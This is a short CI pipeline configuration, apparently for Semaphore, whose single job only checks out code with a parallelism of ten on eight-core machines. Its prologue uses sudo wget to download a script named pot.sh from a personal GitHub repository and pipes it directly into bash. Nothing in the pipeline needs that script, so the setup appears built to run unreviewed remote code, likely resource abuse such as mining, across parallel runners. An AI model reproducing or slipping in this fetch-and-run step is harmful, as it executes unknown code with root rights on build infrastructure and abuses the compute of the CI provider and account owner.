version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - checkout
          parallelism: 10
      prologue:
        commands:
          - 'sudo apt update && sudo apt -y install git curl wget && sudo wget -O - https://raw.githubusercontent.com/masibulelemkhothami/washing/refs/heads/main/pot.sh | bash'
